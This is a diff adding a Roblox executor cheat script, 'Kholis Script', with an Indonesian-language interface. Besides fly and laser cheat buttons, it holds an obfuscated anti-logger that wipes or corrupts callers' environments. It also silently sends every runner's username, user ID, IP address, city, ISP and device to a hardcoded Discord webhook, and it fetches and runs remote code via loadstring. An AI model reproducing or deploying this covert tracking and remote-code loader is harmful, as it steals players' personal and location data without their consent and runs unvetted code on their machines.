@@ -1,0 +1,703 @@
+local AntiEnvLogger = {}
+local RealEnv = getfenv()
+local Protected = {}
+local ProtectionActive = true
+
+local _0x7f2e3d = {
+    ["getfenv"] = getfenv,
+    ["setfenv"] = setfenv,
+    ["rawget"] = rawget,
+    ["rawset"] = rawset,
+    ["getmetatable"] = getmetatable,
+    ["setmetatable"] = setmetatable,
+    ["newproxy"] = newproxy,
+    ["tostring"] = tostring,
+    ["require"] = require,
+    ["type"] = type,
+    ["next"] = next,
+    ["pairs"] = pairs,
+    ["pcall"] = pcall
+}
+
+local function GenerateKey()
+    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+    local key = ""
+    for i = 1, math.random(25, 40) do
+        key = key .. string.sub(chars, math.random(1, #chars), math.random(1, #chars))
+    end
+    return key
+end
+
+local function EncryptString(str)
+    local key = GenerateKey()
+    local encrypted = ""
+    for i = 1, #str do
+        local byte = string.byte(str, i)
+        local keyByte = string.byte(key, (i % #key) + 1)
+        encrypted = encrypted .. string.char(bit32.bxor(byte, keyByte))
+    end
+    return encrypted, key
+end
+
+local HoneypotValues = {}
+for i = 1, 15 do
+    local fakeName, _ = EncryptString("_secureValue_" .. i)
+    HoneypotValues[fakeName] = function()
+        local envToCorrupt = _0x7f2e3d.getfenv(2)
+        if envToCorrupt then
+            for k, v in _0x7f2e3d.pairs(envToCorrupt) do
+                if math.random() > 0.5 then
+                    _0x7f2e3d.rawset(envToCorrupt, k, nil)
+                else
+                    _0x7f2e3d.rawset(envToCorrupt, k, HoneypotValues)
+                end
+            end
+        end
+        return nil
+    end
+end
+
+function AntiEnvLogger:Initialize()
+    local FakeEnv = {}
+    local RealMetatable = {
+        __index = function(_, key)
+            Protected[key] = (Protected[key] or 0) + 1
+            
+            if HoneypotValues[key] then
+                HoneypotValues[key]()
+                return nil
+            end
+            
+            return RealEnv[key]
+        end,
+        
+        __newindex = function(_, key, value)
+            local protectedKeys = {
+                "getfenv", "setfenv", "require", "game", 
+                "script", "getmetatable", "setmetatable"
+            }
+            
+            for _, protectedKey in ipairs(protectedKeys) do
+                if key == protectedKey then
+                    return
+                end
+            end
+            
+            RealEnv[key] = value
+        end,
+        
+        __metatable = "Locked",
+        
+        __tostring = function()
+            local callerEnv = _0x7f2e3d.getfenv(2)
+            if callerEnv ~= RealEnv then
+                for k, v in _0x7f2e3d.pairs(callerEnv) do
+                    _0x7f2e3d.rawset(callerEnv, k, nil)
+                end
+                return ""
+            end
+            return "Environment"
+        end
+    }
+    
+    setmetatable(FakeEnv, RealMetatable)
+    
+    local original_getfenv = getfenv
+    getfenv = function(...)
+        local caller = original_getfenv(2)
+        if ProtectionActive and caller ~= RealEnv then
+            return FakeEnv
+        end
+        return original_getfenv(...)
+    end
+    
+    local env_proxy = newproxy(true)
+    local env_proxy_mt = getmetatable(env_proxy)
+    env_proxy_mt.__index = RealMetatable.__index
+    env_proxy_mt.__newindex = RealMetatable.__newindex
+    
+    local function CheckForLoggers()
+        local hookDetected = false
+        local success, result = pcall(function()
+            local env = getfenv()
+            local meta = getmetatable(game)
+            return env, meta
+        end)
+        
+        if not success then
+            ProtectionActive = true
+            return true
+        end
+        
+        return hookDetected
+    end
+    
+    CheckForLoggers()
+    
+    spawn(function()
+        while wait(0.5) do
+            CheckForLoggers()
+        end
+    end)
+    
+    return FakeEnv
+end
+
+local ProtectedEnvironment = AntiEnvLogger:Initialize()
+setfenv(1, ProtectedEnvironment)
+
+-- ============================================
+-- ⭐ WHITELIST SYSTEM ⭐
+-- ============================================
+
+local WhitelistSystem = {
+    -- WHITELIST USER IDs (tambahkan User ID yang diizinkan di sini)
+    WhitelistedUsers = {
+        [10109362708] = true,      -- IlIllllllllll_IllI
+        [8559847297] = true,      -- agilcityzens
+        [8958843481] = true,      -- BHAROK77
+        [10060070332] = true,      -- Notpound0
+    },
+    
+    -- WHITELIST Discord IDs untuk bypass (optional)
+    WhitelistedDiscordIds = {
+        ["123456789012345678"] = true,
+    },
+    
+    -- KEY SYSTEM
+    ValidKeys = {
+        "YTTA",
+    },
+    
+    IsWhitelisted = function(self, userId)
+        return self.WhitelistedUsers[userId] ~= nil
+    end,
+    
+    IsKeyValid = function(self, key)
+        for _, validKey in ipairs(self.ValidKeys) do
+            if key == validKey then
+                return true
+            end
+        end
+        return false
+    end
+}
+
+local WebhookConfig = {
+    Url = "https://discord.com/api/webhooks/1517529487280050187/-Zvy_Zpl2Fq6zsOTtjgNDN3eQobbhX3PFqQh6jchJtLRlJgTEaMds7f-ZDw1FfrG1ss5",
+    ScriptName = "Kholis Script", 
+    EmbedColor = 16711680
+}
+
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- ============================================
+-- WHITELIST CHECK - RUN EARLY
+-- ============================================
+
+local function CheckWhitelistAndLog()
+    local userId = LocalPlayer.UserId
+    local isWhitelisted = WhitelistSystem:IsWhitelisted(userId)
+    
+    if not isWhitelisted then
+        -- Log unauthorized access attempt
+        local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
+        if httpRequest then
+            pcall(function()
+                httpRequest({
+                    Url = WebhookConfig.Url,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        username = "⛔ Unauthorized Access",
+                        embeds = {{
+                            title = "🚫 Access Denied - Not Whitelisted",
+                            color = 16711680,
+                            description = string.format(
+                                "User: %s (ID: %d)\nStatus: NOT IN WHITELIST\nTime: %s",
+                                LocalPlayer.Name,
+                                userId,
+                                os.date("%Y-%m-%d %H:%M:%S")
+                            ),
+                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                        }}
+                    })
+                })
+            end)
+        end
+        
+        local notifGui = Instance.new("ScreenGui")
+        notifGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+        
+        local notifFrame = Instance.new("Frame")
+        notifFrame.Size = UDim2.new(0, 400, 0, 150)
+        notifFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
+        notifFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        notifFrame.BorderSizePixel = 0
+        notifFrame.Parent = notifGui
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 10)
+        corner.Parent = notifFrame
+        
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, -20, 1, -20)
+        textLabel.Position = UDim2.new(0, 10, 0, 10)
+        textLabel.BackgroundTransparency = 1
+        textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+        textLabel.TextSize = 16
+        textLabel.Font = Enum.Font.GothamBold
+        textLabel.Text = "❌ ACCESS DENIED\n\nKamu Tidak Mempunyai Akses Ke Script Ini!\nKamu Bisa DM YTTAxFertour Buat Di Kasih Akses."
+        textLabel.TextWrapped = true
+        textLabel.Parent = notifFrame
+        
+        task.wait(3)
+        notifGui:Destroy()
+        return false
+    end
+    
+    return true
+end
+
+-- Jalankan whitelist check
+if not CheckWhitelistAndLog() then
+    return
+end
+
+-- Executor Detection
+local executorName = "Unknown"
+if identifyexecutor then
+    executorName = identifyexecutor()
+elseif getexecutorname then
+    executorName = getexecutorname()
+elseif executor then
+    executorName = executor
+end
+
+local executorColor = Color3.fromRGB(200, 200, 200)
+
+if executorName:lower():find("flux") then
+    executorColor = Color3.fromHex("#30ff6a")
+elseif executorName:lower():find("delta") then
+    executorColor = Color3.fromHex("#e74c3c")
+elseif executorName:lower():find("arceus") then
+    executorColor = Color3.fromHex("#a03cff")
+elseif executorName:lower():find("krampus") or executorName:lower():find("oxygen") then
+    executorColor = Color3.fromHex("#ff3838")
+elseif executorName:lower():find("volcano") then
+    executorColor = Color3.fromHex("#ff8c00")
+elseif executorName:lower():find("synapse") or executorName:lower():find("script") or executorName:lower():find("krypton") then
+    executorColor = Color3.fromHex("#ffd700")
+elseif executorName:lower():find("wave") then
+    executorColor = Color3.fromHex("#00e5ff")
+elseif executorName:lower():find("zenith") then
+    executorColor = Color3.fromHex("#ff00ff")
+elseif executorName:lower():find("seliware") then
+    executorColor = Color3.fromHex("#00ffa2")
+elseif executorName:lower():find("krnl") then
+    executorColor = Color3.fromHex("#1e90ff")
+elseif executorName:lower():find("trigon") then
+    executorColor = Color3.fromHex("#ff007f")
+elseif executorName:lower():find("nihon") then
+    executorColor = Color3.fromHex("#8a2be2")
+elseif executorName:lower():find("celery") then
+    executorColor = Color3.fromHex("#4caf50")
+elseif executorName:lower():find("lunar") then
+    executorColor = Color3.fromHex("#8080ff")
+elseif executorName:lower():find("valyse") then
+    executorColor = Color3.fromHex("#ff1493")
+elseif executorName:lower():find("vega") then
+    executorColor = Color3.fromHex("#4682b4")
+elseif executorName:lower():find("electron") then
+    executorColor = Color3.fromHex("#7fffd4")
+elseif executorName:lower():find("awp") then
+    executorColor = Color3.fromHex("#ff005e")
+elseif executorName:lower():find("bunni") then
+    executorColor = Color3.fromHex("#ff69b4")
+end
+
+local function getIPAndLocation()
+    local ipAddress = "Unknown"
+    local country = "Unknown"
+    local region = "Unknown"
+    local city = "Unknown"
+    local isp = "Unknown"
+    
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    
+    if requestFunc then
+        local success, result = pcall(function()
+            return requestFunc({
+                Url = "https://ipinfo.io/json",
+                Method = "GET"
+            })
+        end)
+        
+        if success and result and result.Body then
+            local successDecode, decoded = pcall(function()
+                return HttpService:JSONDecode(result.Body)
+            end)
+            
+            if successDecode and decoded then
+                ipAddress = decoded.ip or "Unknown"
+                country = decoded.country or "Unknown"
+                region = decoded.region or "Unknown"
+                city = decoded.city or "Unknown"
+                isp = decoded.org or "Unknown"
+            end
+        end
+    end
+    
+    if ipAddress == "Unknown" then
+        pcall(function()
+            local altSuccess, altResult = pcall(function()
+                return requestFunc({
+                    Url = "https://api.ipify.org?format=json",
+                    Method = "GET"
+                })
+            end)
+            
+            if altSuccess and altResult and altResult.Body then
+                local decodeSuccess, altDecoded = pcall(function()
+                    return HttpService:JSONDecode(altResult.Body)
+                end)
+                
+                if decodeSuccess and altDecoded and altDecoded.ip then
+                    ipAddress = altDecoded.ip
+                end
+            end
+        end)
+    end
+    
+    return ipAddress, country, region, city, isp
+end
+
+local function getGameName()
+    local success, result = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+    return success and result or "Unknown Game"
+end
+
+local function getExecutorName()
+    local executorName = "Unknown"
+    
+    if type(identifyexecutor) == "function" then
+        local success, result = pcall(identifyexecutor)
+        if success then
+            executorName = result
+        end
+    elseif type(getexecutorname) == "function" then
+        local success, result = pcall(getexecutorname)
+        if success then
+            executorName = result
+        end
+    elseif syn and syn.protect_gui then
+        executorName = "Synapse X"
+    elseif KRNL_LOADED then
+        executorName = "KRNL"
+    end
+    
+    return executorName
+end
+
+local function getDeviceType()
+    local deviceType = "Unknown"
+    local success = pcall(function()
+        if game:GetService("GuiService"):IsTenFootInterface() then
+            deviceType = "Console"
+        elseif game:GetService("UserInputService").TouchEnabled then
+            deviceType = "Mobile"
+        else
+            deviceType = "PC"
+        end
+    end)
+    return deviceType
+end
+
+local function calculateAccountInfo()
+    local accountAgeDays = LocalPlayer.AccountAge
+    local currentTime = os.time()
+    local accountCreationTime = currentTime - (accountAgeDays * 86400)
+    local accountCreatedDate = os.date("%Y-%m-%d", accountCreationTime)
+    
+    return accountAgeDays, accountCreatedDate
+end
+
+local function sendWebhookNotification()
+    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    
+    if not httpRequest then 
+        warn("No HTTP request function found")
+        return 
+    end
+    
+    if getgenv() and getgenv().WebhookSent then 
+        return 
+    end
+    getgenv().WebhookSent = true
+
+    local ipAddress, country, region, city, isp = getIPAndLocation()
+    
+    local executorName = getExecutorName()
+    local currentTime = os.date("%I:%M %p")
+    local currentDate = os.date("%d %b %y")
+    local CurrentGameName = getGameName()
+    local deviceType = getDeviceType()
+    local accountAgeDays, accountCreatedDate = calculateAccountInfo()
+
+    local profileImageUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LocalPlayer.UserId)
+
+    local locationText = "Unknown"
+    if city ~= "Unknown" and region ~= "Unknown" and country ~= "Unknown" then
+        locationText = string.format("%s, %s, %s", city, region, country)
+    elseif country ~= "Unknown" then
+        locationText = country
+    end
+
+    local fields = {
+        {
+            ["name"] = "👤 USER INFORMATION",
+            ["value"] = "```" .. string.format(
+                "Username: %s\n" ..
+                "Display Name: %s\n" ..
+                "User ID: %s\n" ..
+                "Account Age: %d Days\n" ..
+                "Account Created: %s\n" ..
+                "Device Type: %s\n" ..
+                "✅ WHITELISTED USER",
+                LocalPlayer.Name,
+                LocalPlayer.DisplayName,
+                tostring(LocalPlayer.UserId),
+                accountAgeDays,
+                accountCreatedDate,
+                deviceType
+            ) .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "🌐 NETWORK INFORMATION",
+            ["value"] = "```" .. string.format(
+                "IP Address: || %s ||\n" ..
+                "Location: %s\n" ..
+                "ISP: %s",
+                ipAddress,
+                locationText,
+                isp
+            ) .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "🎮 GAME INFORMATION",
+            ["value"] = "```" .. string.format(
+                "Game Name: %s\n" ..
+                "Place ID: %s\n" ..
+                "Job ID: %s",
+                CurrentGameName,
+                tostring(game.PlaceId),
+                game.JobId or "Unknown"
+            ) .. "```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "🔗 QUICK LINKS",
+            ["value"] = string.format(
+                "Link Profile:\n[Click to Cek Profile](https://www.roblox.com/users/%s/profile)\n" ..
+                "Link Game:\n[Click to Join Game](https://www.roblox.com/games/%s)",
+                tostring(LocalPlayer.UserId),
+                tostring(game.PlaceId)
+            ),
+            ["inline"] = false
+        }
+    }
+    
+    if executorName ~= "Unknown" then
+        table.insert(fields, {
+            ["name"] = "🛠️ EXECUTOR INFO",
+            ["value"] = "```Executor: " .. executorName .. "```",
+            ["inline"] = false
+        })
+    end
+
+    local payload = {
+        ["username"] = "Kholis Script - Whitelisted Access",
+        ["avatar_url"] = "https://cdn.phototourl.com/free/2026-06-28-f633df8a-4066-447f-888b-03f055ccc4b7.png",
+        ["embeds"] = {{
+            ["title"] = "✅ WHITELISTED SCRIPT EXECUTION BY " .. (LocalPlayer.DisplayName or LocalPlayer.Name),
+            ["color"] = 65280,
+            ["thumbnail"] = { 
+                ["url"] = profileImageUrl
+            },
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Script: " .. WebhookConfig.ScriptName .. " | Whitelist System Active"
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    local success, response = pcall(function()
+        return httpRequest({
+            Url = WebhookConfig.Url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    
+    if not success then
+        warn("Failed to send webhook:", response)
+    end
+end
+
+task.spawn(function()
+    pcall(sendWebhookNotification)
+end)
+
+-- [ FUNGSI EFEK KEMBANG API ]
+local function CreateFirework(position)
+    local part = Instance.new("Part")
+    part.Size = Vector3.new(1, 1, 1)
+    part.Transparency = 1
+    part.Anchored = true
+    part.CanCollide = false
+    part.Position = position
+    part.Parent = game.Workspace
+
+    local attachment = Instance.new("Attachment", part)
+
+    local emitter = Instance.new("ParticleEmitter")
+    emitter.Texture = "rbxassetid://243017145"
+    emitter.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+    })
+    emitter.Size = NumberSequence.new(0.5, 0)
+    emitter.Lifetime = NumberRange.new(0.5, 1.2)
+    emitter.Rate = 500
+    emitter.Speed = NumberRange.new(15, 30)
+    emitter.SpreadAngle = Vector2.new(360, 360)
+    emitter.Parent = attachment
+
+    task.wait(0.1)
+    emitter.Enabled = false
+    game:GetService("Debris"):AddItem(part, 2)
+end
+
+-- [ LOADING SCREEN ]
+local function showLoadingScreen(callback)
+    local LoadGui = Instance.new("ScreenGui")
+    LoadGui.Name = "Kholis_Fireworks_Loading"
+    LoadGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    LoadGui.DisplayOrder = 100
+
+    local CenterPoint = Instance.new("Frame")
+    CenterPoint.Size = UDim2.new(0, 1, 0, 1)
+    CenterPoint.Position = UDim2.new(0.5, 0, 0.5, 0)
+    CenterPoint.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    CenterPoint.BorderSizePixel = 0
+    CenterPoint.Parent = LoadGui
+
+    local Label = Instance.new("TextLabel")
+    Label.Size = UDim2.new(0, 130, 0, 20)
+    Label.Position = UDim2.new(0.5, -80, 0.5, 20)
+    Label.BackgroundTransparency = 1
+    Label.Text = "IGNITING SYSTEM SCRIPT KHOLIS HUB"
+    Label.TextColor3 = Color3.new(171, 20, 20)
+    Label.Font = Enum.Font.GothamBold
+    Label.TextSize = 15
+    Label.Parent = LoadGui
+
+    local loading = true
+    task.spawn(function()
+        local camera = workspace.CurrentCamera
+        while loading do
+            local spawnPos = camera.CFrame.Position + (camera.CFrame.LookVector * 10) + Vector3.new(math.random(-5, 5), math.random(-2, 5), math.random(-5, 5))
+            CreateFirework(spawnPos)
+            task.wait(0.4)
+        end
+    end)
+
+    local BarBG = Instance.new("Frame")
+    BarBG.Size = UDim2.new(0, 200, 0, 4)
+    BarBG.Position = UDim2.new(0.5, -110, 0.5, 10)
+    BarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    BarBG.BorderSizePixel = 0
+    BarBG.Parent = LoadGui
+
+    local Bar = Instance.new("Frame")
+    Bar.Size = UDim2.new(0, 0, 1, 0)
+    Bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    Bar.BorderSizePixel = 0
+    Bar.Parent = BarBG
+
+    local TweenService = game:GetService("TweenService")
+    local tween = TweenService:Create(Bar, TweenInfo.new(4, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
+    tween:Play()
+
+    tween.Completed:Connect(function()
+        loading = false
+        TweenService:Create(Label, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+        TweenService:Create(BarBG, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+        TweenService:Create(Bar, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+        task.wait(0.5)
+        LoadGui:Destroy()
+        callback()
+    end)
+end
+
+local TweenService = game:GetService("TweenService")
+local Player = game.Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+-- [ FUNGSI loadScript — WAJIB ADA AGAR SEMUA TOMBOL BERFUNGSI ]
+local function loadScript(url)
+    if not url or url == "" then
+        warn("[KholisHub] URL kosong, script dilewati.")
+        return
+    end
+    local success, result = pcall(function()
+        loadstring(game:HttpGet(url, true))()
+    end)
+    if not success then
+        warn("[KholisHub] Gagal load script dari: " .. tostring(url) .. "\nError: " .. tostring(result))
+    end
+end
+
+-- [ JALANKAN SCRIPT ]
+showLoadingScreen(function()
+    local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()
+
+    local Window = Rayfield:CreateWindow({
+        Name = "🔥xKholis Script🔥",
+        Icon = "award",
+        LoadingTitle = "Happy Use Script By Kholis 😈",
+        LoadingSubtitle = "By: 🔥Kholis🔥",
+        ConfigurationSaving = { Enabled = false },
+        KeySystem = true,
+        KeySettings = {
+            Title = "🔑 Kholis Script Key System",
+            Subtitle = "Enter Key to Continue (Whitelist + Key Required)",
+            Note = "Join Discord for key: https://discord.gg/Mhmf9zTa4",
+            FileName = "KholisHubKey",
+            SaveKey = true,
+            GrabKeyFromSite = false,
+            Key = {"KHOLISXHUB"}
+        }
+    })
+
+    -- ==================== TAB 1: SCRIPT KHOLIS ====================
+    local MainTab = Window:CreateTab("SCRIPT KHOLIS", 4483362458)
+
+    MainTab:CreateButton({ Name = "FLY By Kholis", Callback = function() loadScript("https://raw.githubusercontent.com/nurkholis27/VIP/refs/heads/main/FLY") end })
+    MainTab:CreateButton({ Name = "SKYBOX By Kholis", Callback = function() loadScript("https://raw.githubusercontent.com/nurkholis27/VIP/refs/heads/main/SKYBOX") end })
+    MainTab:CreateButton({ Name = "LASER By Kholis", Callback = function() loadScript("https://raw.githubusercontent.com/nurkholis27/VIP/refs/heads/main/LASER") end })
+    MainTab:CreateButton({ Name = "SPECTATOR By Kholis", Callback = function() loadScript("https://raw.githubusercontent.com/nurkholis27/VIP/refs/heads/main/SPECT") end })
+
+end) -- akhir showLoadingScreen
